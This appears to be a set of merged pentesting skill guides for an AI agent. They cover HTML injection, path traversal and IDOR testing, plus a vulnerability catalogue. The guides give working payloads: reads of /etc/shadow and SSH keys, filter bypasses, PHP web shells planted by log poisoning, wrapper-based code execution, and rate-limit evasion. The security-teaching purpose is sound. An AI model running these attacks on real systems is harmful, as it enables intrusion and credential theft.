element.innerHTML = clean;
```

Server-side protections:
- Input validation (whitelist allowed characters)
- Output encoding (context-aware escaping)
- Content Security Policy (CSP) headers
- Web Application Firewall (WAF) rules

## Quick Reference

### Common Test Payloads

| Payload | Purpose |
|---------|---------|
| `<h1>Test</h1>` | Basic rendering test |
| `<b>Bold</b>` | Simple formatting |
| `<a href="evil.com">Link</a>` | Link injection |
| `<img src=x>` | Image tag test |
| `<div style="color:red">` | Style injection |
| `<form action="evil.com">` | Form hijacking |

### Injection Contexts

| Context | Test Approach |
|---------|---------------|
| URL parameter | `?param=<h1>test</h1>` |
| Form field | POST with HTML payload |
| Cookie value | Inject via document.cookie |
| HTTP header | Inject in Referer/User-Agent |
| File upload | HTML file with malicious content |

### Encoding Types

| Type | Example |
|------|---------|
| URL encoding | `%3Ch1%3E` = `<h1>` |
| HTML entities | `&#60;h1&#62;` = `<h1>` |
| Double encoding | `%253C` = `<` |
| Unicode | `\u003c` = `<` |

## Constraints and Limitations

### Attack Limitations
- Modern browsers may sanitize some injections
- CSP can prevent inline styles and scripts
- WAFs may block common payloads
- Some applications escape output properly

### Testing Considerations
- Distinguish between HTML injection and XSS
- Verify visual impact in browser
- Test in multiple browsers
- Check for stored vs reflected

### Severity Assessment
- Lower severity than XSS (no script execution)
- Higher impact when combined with phishing
- Consider defacement/reputation damage
- Evaluate credential theft potential

## Troubleshooting

| Issue | Solutions |
|-------|-----------|
| HTML not rendering | Check if output HTML-encoded; try encoding variations; verify HTML context |
| Payload stripped | Use encoding variations; try tag splitting; test null bytes; nested tags |
| XSS not working (HTML only) | JS filtered but HTML allowed; leverage phishing forms, meta refresh redirects |

## When to Use
This skill is applicable to execute the workflow or actions described in the overview.


<!-- MERGED INTO: web-vuln-testing on 2026-04-18 -->
<!-- Use `web-vuln-testing` instead. -->

---

<!-- file-path-traversal -->
## Purpose

Identify and exploit file path traversal (directory traversal) vulnerabilities that allow attackers to read arbitrary files on the server, potentially including sensitive configuration files, credentials, and source code. This vulnerability occurs when user-controllable input is passed to filesystem APIs without proper validation.

## Prerequisites

### Required Tools
- Web browser with developer tools
- Burp Suite or OWASP ZAP
- cURL for testing payloads
- Wordlists for automation
- ffuf or wfuzz for fuzzing

### Required Knowledge
- HTTP request/response structure
- Linux and Windows filesystem layout
- Web application architecture
- Basic understanding of file APIs

## Outputs and Deliverables

1. **Vulnerability Report** - Identified traversal points and severity
2. **Exploitation Proof** - Extracted file contents
3. **Impact Assessment** - Accessible files and data exposure
4. **Remediation Guidance** - Secure coding recommendations

## Core Workflow

### Phase 1: Understanding Path Traversal

Path traversal occurs when applications use user input to construct file paths:

```php
// Vulnerable PHP code example
$template = "blue.php";
if (isset($_COOKIE['template']) && !empty($_COOKIE['template'])) {
    $template = $_COOKIE['template'];
}
include("/home/user/templates/" . $template);
```

Attack principle:
- `../` sequence moves up one directory
- Chain multiple sequences to reach root
- Access files outside intended directory

Impact:
- **Confidentiality** - Read sensitive files
- **Integrity** - Write/modify files (in some cases)
- **Availability** - Delete files (in some cases)
- **Code Execution** - If combined with file upload or log poisoning

### Phase 2: Identifying Traversal Points

Map application for potential file operations:

```bash
# Parameters that often handle files
?file=
?path=
?page=
?template=
?filename=
?doc=
?document=
?folder=
?dir=
?include=
?src=
?source=
?content=
?view=
?download=
?load=
?read=
?retrieve=
```

Common vulnerable functionality:
- Image loading: `/image?filename=23.jpg`
- Template selection: `?template=blue.php`
- File downloads: `/download?file=report.pdf`
- Document viewers: `/view?doc=manual.pdf`
- Include mechanisms: `?page=about`

### Phase 3: Basic Exploitation Techniques

#### Simple Path Traversal

```bash
# Basic Linux traversal
../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd
../../../../../../etc/passwd

# Windows traversal
..\..\..\windows\win.ini
..\..\..\..\windows\system32\drivers\etc\hosts

# URL encoded
..%2F..%2F..%2Fetc%2Fpasswd
..%252F..%252F..%252Fetc%252Fpasswd  # Double encoding

# Test payloads with curl
curl "http://target.com/image?filename=../../../etc/passwd"
curl "http://target.com/download?file=....//....//....//etc/passwd"
```

#### Absolute Path Injection

```bash
# Direct absolute path (Linux)
/etc/passwd
/etc/shadow
/etc/hosts
/proc/self/environ

# Direct absolute path (Windows)
C:\windows\win.ini
C:\windows\system32\drivers\etc\hosts
C:\boot.ini
```

### Phase 4: Bypass Techniques

#### Bypass Stripped Traversal Sequences

```bash
# When ../ is stripped once
....//....//....//etc/passwd
....\/....\/....\/etc/passwd

# Nested traversal
..././..././..././etc/passwd
....//....//etc/passwd

# Mixed encoding
..%2f..%2f..%2fetc/passwd
%2e%2e/%2e%2e/%2e%2e/etc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

#### Bypass Extension Validation

```bash
# Null byte injection (older PHP versions)
../../../etc/passwd%00.jpg
../../../etc/passwd%00.png

# Path truncation
../../../etc/passwd...............................

# Double extension
../../../etc/passwd.jpg.php
```

#### Bypass Base Directory Validation

```bash
# When path must start with expected directory
/var/www/images/../../../etc/passwd

# Expected path followed by traversal
images/../../../etc/passwd
```

#### Bypass Blacklist Filters

```bash
# Unicode/UTF-8 encoding
..%c0%af..%c0%af..%c0%afetc/passwd
..%c1%9c..%c1%9c..%c1%9cetc/passwd

# Overlong UTF-8 encoding
%c0%2e%c0%2e%c0%af

# URL encoding variations
%2e%2e/
%2e%2e%5c
..%5c
..%255c

# Case variations (Windows)
....\\....\\etc\\passwd
```

### Phase 5: Linux Target Files

High-value files to target:

```bash
# System files
/etc/passwd           # User accounts
/etc/shadow           # Password hashes (root only)
/etc/group            # Group information
/etc/hosts            # Host mappings
/etc/hostname         # System hostname
/etc/issue            # System banner

# SSH files
/root/.ssh/id_rsa           # Root private key
/root/.ssh/authorized_keys  # Authorized keys
/home/<user>/.ssh/id_rsa    # User private keys
/etc/ssh/sshd_config        # SSH configuration

# Web server files
/etc/apache2/apache2.conf
/etc/nginx/nginx.conf
/etc/apache2/sites-enabled/000-default.conf
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log

# Application files
/var/www/html/config.php
/var/www/html/wp-config.php
/var/www/html/.htaccess
/var/www/html/web.config

# Process information
/proc/self/environ      # Environment variables
/proc/self/cmdline      # Process command line
/proc/self/fd/0         # File descriptors
/proc/version           # Kernel version

# Common application configs
/etc/mysql/my.cnf
/etc/postgresql/*/postgresql.conf
/opt/lampp/etc/httpd.conf
```

### Phase 6: Windows Target Files

Windows-specific targets:

```bash
# System files
C:\windows\win.ini
C:\windows\system.ini
C:\boot.ini
C:\windows\system32\drivers\etc\hosts
C:\windows\system32\config\SAM
C:\windows\repair\SAM

# IIS files
C:\inetpub\wwwroot\web.config
C:\inetpub\logs\LogFiles\W3SVC1\

# Configuration files
C:\xampp\apache\conf\httpd.conf
C:\xampp\mysql\data\mysql\user.MYD
C:\xampp\passwords.txt
C:\xampp\phpmyadmin\config.inc.php

# User files
C:\Users\<user>\.ssh\id_rsa
C:\Users\<user>\Desktop\
C:\Documents and Settings\<user>\
```

### Phase 7: Automated Testing

#### Using Burp Suite

```
1. Capture request with file parameter
2. Send to Intruder
3. Mark file parameter value as payload position
4. Load path traversal wordlist
5. Start attack
6. Filter responses by size/content for success
```

#### Using ffuf

```bash
# Basic traversal fuzzing
ffuf -u "http://target.com/image?filename=FUZZ" \
     -w /usr/share/wordlists/traversal.txt \
     -mc 200

# Fuzzing with encoding
ffuf -u "http://target.com/page?file=FUZZ" \
     -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
     -mc 200,500 -ac
```

#### Using wfuzz

```bash
# Traverse to /etc/passwd
wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
      --hc 404 \
      "http://target.com/index.php?file=FUZZ"

# With headers/cookies
wfuzz -c -z file,traversal.txt \
      -H "Cookie: session=abc123" \
      "http://target.com/load?path=FUZZ"
```

### Phase 8: LFI to RCE Escalation

#### Log Poisoning

```bash
# Inject PHP code into logs
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/

# Include Apache log file
curl "http://target.com/page?file=../../../var/log/apache2/access.log&cmd=id"

# Include auth.log (SSH)
# First: ssh '<?php system($_GET["cmd"]); ?>'@target.com
curl "http://target.com/page?file=../../../var/log/auth.log&cmd=whoami"
```

#### Proc/self/environ

```bash
# Inject via User-Agent
curl -A "<?php system('id'); ?>" \
     "http://target.com/page?file=/proc/self/environ"

# With command parameter
curl -A "<?php system(\$_GET['c']); ?>" \
     "http://target.com/page?file=/proc/self/environ&c=whoami"
```

#### PHP Wrapper Exploitation

```bash
# php://filter - Read source code as base64
curl "http://target.com/page?file=php://filter/convert.base64-encode/resource=config.php"

# php://input - Execute POST data as PHP
curl -X POST -d "<?php system('id'); ?>" \
     "http://target.com/page?file=php://input"

# data:// - Execute inline PHP
curl "http://target.com/page?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==&c=id"

# expect:// - Execute system commands
curl "http://target.com/page?file=expect://id"
```

### Phase 9: Testing Methodology

Structured testing approach:

```bash
# Step 1: Identify potential parameters
# Look for file-related functionality

# Step 2: Test basic traversal
../../../etc/passwd

# Step 3: Test encoding variations
..%2F..%2F..%2Fetc%2Fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd

# Step 4: Test bypass techniques
....//....//....//etc/passwd
..;/..;/..;/etc/passwd

# Step 5: Test absolute paths
/etc/passwd

# Step 6: Test with null bytes (legacy)
../../../etc/passwd%00.jpg

# Step 7: Attempt wrapper exploitation
php://filter/convert.base64-encode/resource=index.php

# Step 8: Attempt log poisoning for RCE
```

### Phase 10: Prevention Measures

Secure coding practices:

```php
// PHP: Use basename() to strip paths
$filename = basename($_GET['file']);
$path = "/var/www/files/" . $filename;

// PHP: Validate against whitelist
$allowed = ['report.pdf', 'manual.pdf', 'guide.pdf'];
if (in_array($_GET['file'], $allowed)) {
    include("/var/www/files/" . $_GET['file']);
}

// PHP: Canonicalize and verify base path
$base = "/var/www/files/";
$realBase = realpath($base);
$userPath = $base . $_GET['file'];
$realUserPath = realpath($userPath);

if ($realUserPath && strpos($realUserPath, $realBase) === 0) {
    include($realUserPath);
}
```

```python
# Python: Use os.path.realpath() and validate
import os

def safe_file_access(base_dir, filename):
    # Resolve to absolute path
    base = os.path.realpath(base_dir)
    file_path = os.path.realpath(os.path.join(base, filename))
    
    # Verify file is within base directory
    if file_path.startswith(base):
        return open(file_path, 'r').read()
    else:
        raise Exception("Access denied")
```

## Quick Reference

### Common Payloads

| Payload | Target |
|---------|--------|
| `../../../etc/passwd` | Linux password file |
| `..\..\..\..\windows\win.ini` | Windows INI file |
| `....//....//....//etc/passwd` | Bypass simple filter |
| `/etc/passwd` | Absolute path |
| `php://filter/convert.base64-encode/resource=config.php` | Source code |

### Target Files

| OS | File | Purpose |
|----|------|---------|
| Linux | `/etc/passwd` | User accounts |
| Linux | `/etc/shadow` | Password hashes |
| Linux | `/proc/self/environ` | Environment vars |
| Windows | `C:\windows\win.ini` | System config |
| Windows | `C:\boot.ini` | Boot config |
| Web | `wp-config.php` | WordPress DB creds |

### Encoding Variants

| Type | Example |
|------|---------|
| URL Encoding | `%2e%2e%2f` = `../` |
| Double Encoding | `%252e%252e%252f` = `../` |
| Unicode | `%c0%af` = `/` |
| Null Byte | `%00` |

## Constraints and Limitations

### Permission Restrictions
- Cannot read files application user cannot access
- Shadow file requires root privileges
- Many files have restrictive permissions

### Application Restrictions
- Extension validation may limit file types
- Base path validation may restrict scope
- WAF may block common payloads

### Testing Considerations
- Respect authorized scope
- Avoid accessing genuinely sensitive data
- Document all successful access

## Troubleshooting

| Problem | Solutions |
|---------|-----------|
| No response difference | Try encoding, blind traversal, different files |
| Payload blocked | Use encoding variants, nested sequences, case variations |
| Cannot escalate to RCE | Check logs, PHP wrappers, file upload, session poisoning |

## When to Use
This skill is applicable to execute the workflow or actions described in the overview.


<!-- MERGED INTO: web-vuln-testing on 2026-04-18 -->
<!-- Use `web-vuln-testing` instead. -->

---

<!-- idor-testing -->
## Purpose

Provide systematic methodologies for identifying and exploiting Insecure Direct Object Reference (IDOR) vulnerabilities in web applications. This skill covers both database object references and static file references, detection techniques using parameter manipulation and enumeration, exploitation via Burp Suite, and remediation strategies for securing applications against unauthorized access.

## Inputs / Prerequisites

- **Target Web Application**: URL of application with user-specific resources
- **Multiple User Accounts**: At least two test accounts to verify cross-user access
- **Burp Suite or Proxy Tool**: Intercepting proxy for request manipulation
- **Authorization**: Written permission for security testing
- **Understanding of Application Flow**: Knowledge of how objects are referenced (IDs, filenames)

## Outputs / Deliverables

- **IDOR Vulnerability Report**: Documentation of discovered access control bypasses
- **Proof of Concept**: Evidence of unauthorized data access across user contexts
- **Affected Endpoints**: List of vulnerable API endpoints and parameters
- **Impact Assessment**: Classification of data exposure severity
- **Remediation Recommendations**: Specific fixes for identified vulnerabilities

## Core Workflow

### 1. Understand IDOR Vulnerability Types

#### Direct Reference to Database Objects
Occurs when applications reference database records via user-controllable parameters:
```
# Original URL (authenticated as User A)
example.com/user/profile?id=2023

# Manipulation attempt (accessing User B's data)
example.com/user/profile?id=2022
```

#### Direct Reference to Static Files
Occurs when applications expose file paths or names that can be enumerated:
```
# Original URL (User A's receipt)
example.com/static/receipt/205.pdf

# Manipulation attempt (User B's receipt)
example.com/static/receipt/200.pdf
```

### 2. Reconnaissance and Setup

#### Create Multiple Test Accounts
```
Account 1: "attacker" - Primary testing account
Account 2: "victim" - Account whose data we attempt to access
```

#### Identify Object References
Capture and analyze requests containing:
- Numeric IDs in URLs: `/api/user/123`
- Numeric IDs in parameters: `?id=123&action=view`
- Numeric IDs in request body: `{"userId": 123}`
- File paths: `/download/receipt_123.pdf`
- GUIDs/UUIDs: `/profile/a1b2c3d4-e5f6-...`

#### Map User IDs
```
# Access user ID endpoint (if available)
GET /api/user-id/

# Note ID patterns:
# - Sequential integers (1, 2, 3...)
# - Auto-incremented values
# - Predictable patterns
```

### 3. Detection Techniques

#### URL Parameter Manipulation
```
# Step 1: Capture original authenticated request
GET /api/user/profile?id=1001 HTTP/1.1
Cookie: session=attacker_session

# Step 2: Modify ID to target another user
GET /api/user/profile?id=1000 HTTP/1.1
Cookie: session=attacker_session

# Vulnerable if: Returns victim's data with attacker's session
```

#### Request Body Manipulation
```
# Original POST request
POST /api/address/update HTTP/1.1
Content-Type: application/json
Cookie: session=attacker_session

{"id": 5, "userId": 1001, "address": "123 Attacker St"}

# Modified request targeting victim
{"id": 5, "userId": 1000, "address": "123 Attacker St"}
```

#### HTTP Method Switching
```
# Original GET request may be protected
GET /api/admin/users/1000 → 403 Forbidden

# Try alternative methods
POST /api/admin/users/1000 → 200 OK (Vulnerable!)
PUT /api/admin/users/1000 → 200 OK (Vulnerable!)
```

### 4. Exploitation with Burp Suite

#### Manual Exploitation
```
1. Configure browser proxy through Burp Suite
2. Login as "attacker" user
3. Navigate to profile/data page
4. Enable Intercept in Proxy tab
5. Capture request with user ID
6. Modify ID to victim's ID
7. Forward request
8. Observe response for victim's data
```

#### Automated Enumeration with Intruder
```
1. Send request to Intruder (Ctrl+I)
2. Clear all payload positions
3. Select ID parameter as payload position
4. Configure attack type: Sniper
5. Payload settings:
   - Type: Numbers
   - Range: 1 to 10000
   - Step: 1
6. Start attack
7. Analyze responses for 200 status codes
```

#### Battering Ram Attack for Multiple Positions
```
# When same ID appears in multiple locations
PUT /api/addresses/§5§/update HTTP/1.1

{"id": §5§, "userId": 3}

Attack Type: Battering Ram
Payload: Numbers 1-1000
```

### 5. Common IDOR Locations

#### API Endpoints
```
/api/user/{id}
/api/profile/{id}
/api/order/{id}
/api/invoice/{id}
/api/document/{id}
/api/message/{id}
/api/address/{id}/update
/api/address/{id}/delete
```

#### File Downloads
```
/download/invoice_{id}.pdf
/static/receipts/{id}.pdf
/uploads/documents/{filename}
/files/reports/report_{date}_{id}.xlsx
```

#### Query Parameters
```
?userId=123
?orderId=456
?documentId=789
?file=report_123.pdf
?account=user@email.com
```

## Quick Reference

### IDOR Testing Checklist

| Test | Method | Indicator of Vulnerability |
|------|--------|---------------------------|
| Increment/Decrement ID | Change `id=5` to `id=4` | Returns different user's data |
| Use Victim's ID | Replace with known victim ID | Access granted to victim's resources |
| Enumerate Range | Test IDs 1-1000 | Find valid records of other users |
| Negative Values | Test `id=-1` or `id=0` | Unexpected data or errors |
| Large Values | Test `id=99999999` | System information disclosure |
| String IDs | Change format `id=user_123` | Logic bypass |
| GUID Manipulation | Modify UUID portions | Predictable UUID patterns |

### Response Analysis

| Status Code | Interpretation |
|-------------|----------------|
| 200 OK | Potential IDOR - verify data ownership |
| 403 Forbidden | Access control working |
| 404 Not Found | Resource doesn't exist |
| 401 Unauthorized | Authentication required |
| 500 Error | Potential input validation issue |

### Common Vulnerable Parameters

| Parameter Type | Examples |
|----------------|----------|
| User identifiers | `userId`, `uid`, `user_id`, `account` |
| Resource identifiers | `id`, `pid`, `docId`, `fileId` |
| Order/Transaction | `orderId`, `transactionId`, `invoiceId` |
| Message/Communication | `messageId`, `threadId`, `chatId` |
| File references | `filename`, `file`, `document`, `path` |

## Constraints and Limitations

### Operational Boundaries
- Requires at least two valid user accounts for verification
- Some applications use session-bound tokens instead of IDs
- GUID/UUID references harder to enumerate but not impossible
- Rate limiting may restrict enumeration attempts
- Some IDOR requires chained vulnerabilities to exploit

### Detection Challenges
- Horizontal privilege escalation (user-to-user) vs vertical (user-to-admin)
- Blind IDOR where response doesn't confirm access
- Time-based IDOR in asynchronous operations
- IDOR in websocket communications

### Legal Requirements
- Only test applications with explicit authorization
- Document all testing activities and findings
- Do not access, modify, or exfiltrate real user data
- Report findings through proper disclosure channels

## Examples

### Example 1: Basic ID Parameter IDOR
```
# Login as attacker (userId=1001)
# Navigate to profile page

# Original request
GET /api/profile?id=1001 HTTP/1.1
Cookie: session=abc123

# Response: Attacker's profile data

# Modified request (targeting victim userId=1000)
GET /api/profile?id=1000 HTTP/1.1
Cookie: session=abc123

# Vulnerable Response: Victim's profile data returned!
```

### Example 2: IDOR in Address Update Endpoint
```
# Intercept address update request
PUT /api/addresses/5/update HTTP/1.1
Content-Type: application/json
Cookie: session=attacker_session

{
  "id": 5,
  "userId": 1001,
  "street": "123 Main St",
  "city": "Test City"
}

# Modify userId to victim's ID
{
  "id": 5,
  "userId": 1000,  # Changed from 1001
  "street": "Hacked Address",
  "city": "Exploit City"
}

# If 200 OK: Address created under victim's account
```

### Example 3: Static File IDOR
```
# Download own receipt
GET /api/download/5 HTTP/1.1
Cookie: session=attacker_session

# Response: PDF of attacker's receipt (order #5)

# Attempt to access other receipts
GET /api/download/3 HTTP/1.1
Cookie: session=attacker_session

# Vulnerable Response: PDF of victim's receipt (order #3)!
```

### Example 4: Burp Intruder Enumeration
```
# Configure Intruder attack
Target: PUT /api/addresses/§1§/update
Payload Position: Address ID in URL and body

Attack Configuration:
- Type: Battering Ram
- Payload: Numbers 0-20, Step 1

Body Template:
{
  "id": §1§,
  "userId": 3
}

# Analyze results:
# - 200 responses indicate successful modification
# - Check victim's account for new addresses
```

### Example 5: Horizontal to Vertical Escalation
```
# Step 1: Enumerate user roles
GET /api/user/1 → {"role": "user", "id": 1}
GET /api/user/2 → {"role": "user", "id": 2}
GET /api/user/3 → {"role": "admin", "id": 3}

# Step 2: Access admin functions with discovered ID
GET /api/admin/dashboard?userId=3 HTTP/1.1
Cookie: session=regular_user_session

# If accessible: Vertical privilege escalation achieved
```

## Troubleshooting

### Issue: All Requests Return 403 Forbidden
**Cause**: Server-side access control is implemented
**Solution**:
```
# Try alternative attack vectors:
1. HTTP method switching (GET → POST → PUT)
2. Add X-Original-URL or X-Rewrite-URL headers
3. Try parameter pollution: ?id=1001&id=1000
4. URL encoding variations: %31%30%30%30 for "1000"
5. Case variations for string IDs
```

### Issue: Application Uses UUIDs Instead of Sequential IDs
**Cause**: Randomized identifiers reduce enumeration risk
**Solution**:
```
# UUID discovery techniques:
1. Check response bodies for leaked UUIDs
2. Search JavaScript files for hardcoded UUIDs
3. Check API responses that list multiple objects
4. Look for UUID patterns in error messages
5. Try UUID v1 (time-based) prediction if applicable
```

### Issue: Session Token Bound to User
**Cause**: Application validates session against requested resource
**Solution**:
```
# Advanced bypass attempts:
1. Test for IDOR in unauthenticated endpoints
2. Check password reset/email verification flows
3. Look for IDOR in file upload/download
4. Test API versioning: /api/v1/ vs /api/v2/
5. Check mobile API endpoints (often less protected)
```

### Issue: Rate Limiting Blocks Enumeration
**Cause**: Application implements request throttling
**Solution**:
```
# Bypass techniques:
1. Add delays between requests (Burp Intruder throttle)
2. Rotate IP addresses (proxy chains)
3. Target specific high-value IDs instead of full range
4. Use different endpoints for same resources
5. Test during off-peak hours
```

### Issue: Cannot Verify IDOR Impact
**Cause**: Response doesn't clearly indicate data ownership
**Solution**:
```
# Verification methods:
1. Create unique identifiable data in victim account
2. Look for PII markers (name, email) in responses
3. Compare response lengths between users
4. Check for timing differences in responses
5. Use secondary indicators (creation dates, metadata)
```

## Remediation Guidance

### Implement Proper Access Control
```python
# Django example - validate ownership
def update_address(request, address_id):
    address = Address.objects.get(id=address_id)
    
    # Verify ownership before allowing update
    if address.user != request.user:
        return HttpResponseForbidden("Unauthorized")
    
    # Proceed with update
    address.update(request.data)
```

### Use Indirect References
```python
# Instead of: /api/address/123
# Use: /api/address/current-user/billing

def get_address(request):
    # Always filter by authenticated user
    address = Address.objects.filter(user=request.user).first()
    return address
```

### Server-Side Validation
```python
# Always validate on server, never trust client input
def download_receipt(request, receipt_id):
    receipt = Receipt.objects.filter(
        id=receipt_id,
        user=request.user  # Critical: filter by current user
    ).first()
    
    if not receipt:
        return HttpResponseNotFound()
    
    return FileResponse(receipt.file)
```

## When to Use
This skill is applicable to execute the workflow or actions described in the overview.


<!-- MERGED INTO: web-vuln-testing on 2026-04-18 -->
<!-- Use `web-vuln-testing` instead. -->

---

<!-- top-web-vulnerabilities -->
## Purpose

Provide a comprehensive, structured reference for the 100 most critical web application vulnerabilities organized by category. This skill enables systematic vulnerability identification, impact assessment, and remediation guidance across the full spectrum of web security threats. Content organized into 15 major vulnerability categories aligned with industry standards and real-world attack patterns.

## Prerequisites

- Basic understanding of web application architecture (client-server model, HTTP protocol)
- Familiarity with common web technologies (HTML, JavaScript, SQL, XML, APIs)
- Understanding of authentication and authorization concepts
- Access to web application security testing tools (Burp Suite, OWASP ZAP)
- Knowledge of secure coding principles recommended

## Outputs and Deliverables

- Complete vulnerability catalog with definitions, root causes, impacts, and mitigations
- Category-based vulnerability groupings for systematic assessment
- Quick reference for security testing and remediation
- Foundation for vulnerability assessment checklists and security policies

---

## Core Workflow

### Phase 1: Injection Vulnerabilities Assessment

Evaluate injection attack vectors targeting data processing components:

**SQL Injection (1)**
- Definition: Malicious SQL code inserted into input fields to manipulate database queries
- Root Cause: Lack of input validation, improper use of parameterized queries
- Impact: Unauthorized data access, data manipulation, database compromise
- Mitigation: Use parameterized queries/prepared statements, input validation, least privilege database accounts

**Cross-Site Scripting - XSS (2)**
- Definition: Injection of malicious scripts into web pages viewed by other users
- Root Cause: Insufficient output encoding, lack of input sanitization
- Impact: Session hijacking, credential theft, website defacement
- Mitigation: Output encoding, Content Security Policy (CSP), input sanitization

**Command Injection (5, 11)**
- Definition: Execution of arbitrary system commands through vulnerable applications
- Root Cause: Unsanitized user input passed to system shells
- Impact: Full system compromise, data exfiltration, lateral movement
- Mitigation: Avoid shell execution, whitelist valid commands, strict input validation

**XML Injection (6), LDAP Injection (7), XPath Injection (8)**
- Definition: Manipulation of XML/LDAP/XPath queries through malicious input
- Root Cause: Improper input handling in query construction
- Impact: Data exposure, authentication bypass, information disclosure
- Mitigation: Input validation, parameterized queries, escape special characters

**Server-Side Template Injection - SSTI (13)**
- Definition: Injection of malicious code into template engines
- Root Cause: User input embedded directly in template expressions
- Impact: Remote code execution, server compromise
- Mitigation: Sandbox template engines, avoid user input in templates, strict input validation

### Phase 2: Authentication and Session Security

Assess authentication mechanism weaknesses:

**Session Fixation (14)**
- Definition: Attacker sets victim's session ID before authentication
- Root Cause: Session ID not regenerated after login
- Impact: Session hijacking, unauthorized account access
- Mitigation: Regenerate session ID on authentication, use secure session management

**Brute Force Attack (15)**
- Definition: Systematic password guessing using automated tools
- Root Cause: Lack of account lockout, rate limiting, or CAPTCHA
- Impact: Unauthorized access, credential compromise
- Mitigation: Account lockout policies, rate limiting, MFA, CAPTCHA

**Session Hijacking (16)**
- Definition: Attacker steals or predicts valid session tokens
- Root Cause: Weak session token generation, insecure transmission
- Impact: Account takeover, unauthorized access
- Mitigation: Secure random token generation, HTTPS, HttpOnly/Secure cookie flags

**Credential Stuffing and Reuse (22)**
- Definition: Using leaked credentials to access accounts across services
- Root Cause: Users reusing passwords, no breach detection
- Impact: Mass account compromise, data breaches
- Mitigation: MFA, breach password checks, unique credential requirements

**Insecure "Remember Me" Functionality (85)**
- Definition: Weak persistent authentication token implementation
- Root Cause: Predictable tokens, inadequate expiration controls
- Impact: Unauthorized persistent access, session compromise
- Mitigation: Strong token generation, proper expiration, secure storage

**CAPTCHA Bypass (86)**
- Definition: Circumventing bot detection mechanisms
- Root Cause: Weak CAPTCHA algorithms, improper validation
- Impact: Automated attacks, credential stuffing, spam
- Mitigation: reCAPTCHA v3, layered bot detection, rate limiting

### Phase 3: Sensitive Data Exposure

Identify data protection failures:

**IDOR - Insecure Direct Object References (23, 42)**
- Definition: Direct access to internal objects via user-supplied references
- Root Cause: Missing authorization checks on object access
- Impact: Unauthorized data access, privacy breaches
- Mitigation: Access control validation, indirect reference maps, authorization checks

**Data Leakage (24)**
- Definition: Inadvertent disclosure of sensitive information
- Root Cause: Inadequate data protection, weak access controls
- Impact: Privacy breaches, regulatory penalties, reputation damage
- Mitigation: DLP solutions, encryption, access controls, security training

**Unencrypted Data Storage (25)**
- Definition: Storing sensitive data without encryption
- Root Cause: Failure to implement encryption at rest
- Impact: Data breaches if storage compromised
- Mitigation: Full-disk encryption, database encryption, secure key management

**Information Disclosure (33)**
- Definition: Exposure of system details through error messages or responses
- Root Cause: Verbose error handling, debug information in production
- Impact: Reconnaissance for further attacks, credential exposure
- Mitigation: Generic error messages, disable debug mode, secure logging

### Phase 4: Security Misconfiguration

Assess configuration weaknesses:

**Missing Security Headers (26)**
- Definition: Absence of protective HTTP headers (CSP, X-Frame-Options, HSTS)
- Root Cause: Inadequate server configuration
- Impact: XSS attacks, clickjacking, protocol downgrade
- Mitigation: Implement CSP, X-Content-Type-Options, X-Frame-Options, HSTS

**Default Passwords (28)**
- Definition: Unchanged default credentials on systems/applications
- Root Cause: Failure to change vendor defaults
- Impact: Unauthorized access, system compromise
- Mitigation: Mandatory password changes, strong password policies

**Directory Listing (29)**
- Definition: Web server exposes directory contents
- Root Cause: Improper server configuration
- Impact: Information disclosure, sensitive file exposure
- Mitigation: Disable directory indexing, use default index files

**Unprotected API Endpoints (30)**
- Definition: APIs lacking authentication or authorization
- Root Cause: Missing security controls on API routes
- Impact: Unauthorized data access, API abuse
- Mitigation: OAuth/API keys, access controls, rate limiting

**Open Ports and Services (31)**
- Definition: Unnecessary network services exposed
- Root Cause: Failure to minimize attack surface
- Impact: Exploitation of vulnerable services
- Mitigation: Port scanning audits, firewall rules, service minimization

**Misconfigured CORS (35)**
- Definition: Overly permissive Cross-Origin Resource Sharing policies
- Root Cause: Wildcard origins, improper CORS configuration
- Impact: Cross-site request attacks, data theft
- Mitigation: Whitelist trusted origins, validate CORS headers

**Unpatched Software (34)**
- Definition: Systems running outdated vulnerable software
- Root Cause: Neglected patch management
- Impact: Exploitation of known vulnerabilities
- Mitigation: Patch management program, vulnerability scanning, automated updates

### Phase 5: XML-Related Vulnerabilities

Evaluate XML processing security:

**XXE - XML External Entity Injection (37)**
- Definition: Exploitation of XML parsers to access files or internal systems
- Root Cause: External entity processing enabled
- Impact: File disclosure, SSRF, denial of service
- Mitigation: Disable external entities, use safe XML parsers

**XEE - XML Entity Expansion (38)**
- Definition: Excessive entity expansion causing resource exhaustion
- Root Cause: Unlimited entity expansion allowed
- Impact: Denial of service, parser crashes
- Mitigation: Limit entity expansion, configure parser restrictions

**XML Bomb (Billion Laughs) (39)**
- Definition: Crafted XML with nested entities consuming resources
- Root Cause: Recursive entity definitions
- Impact: Memory exhaustion, denial of service
- Mitigation: Entity expansion limits, input size restrictions

**XML Denial of Service (65)**
- Definition: Specially crafted XML causing excessive processing
- Root Cause: Complex document structures without limits
- Impact: CPU/memory exhaustion, service unavailability
- Mitigation: Schema validation, size limits, processing timeouts

### Phase 6: Broken Access Control

Assess authorization enforcement:

**Inadequate Authorization (40)**
- Definition: Failure to properly enforce access controls
- Root Cause: Weak authorization policies, missing checks
- Impact: Unauthorized access to sensitive resources
- Mitigation: RBAC, centralized IAM, regular access reviews

**Privilege Escalation (41)**
- Definition: Gaining elevated access beyond intended permissions
- Root Cause: Misconfigured permissions, system vulnerabilities
- Impact: Full system compromise, data manipulation
- Mitigation: Least privilege, regular patching, privilege monitoring

**Forceful Browsing (43)**
- Definition: Direct URL manipulation to access restricted resources
- Root Cause: Weak access controls, predictable URLs
- Impact: Unauthorized file/directory access
- Mitigation: Server-side access controls, unpredictable resource paths

**Missing Function-Level Access Control (44)**
- Definition: Unprotected administrative or privileged functions
- Root Cause: Authorization only at UI level
- Impact: Unauthorized function execution
- Mitigation: Server-side authorization for all functions, RBAC

### Phase 7: Insecure Deserialization

Evaluate object serialization security:

**Remote Code Execution via Deserialization (45)**
- Definition: Arbitrary code execution through malicious serialized objects
- Root Cause: Untrusted data deserialized without validation
- Impact: Complete system compromise, code execution
- Mitigation: Avoid deserializing untrusted data, integrity checks, type validation

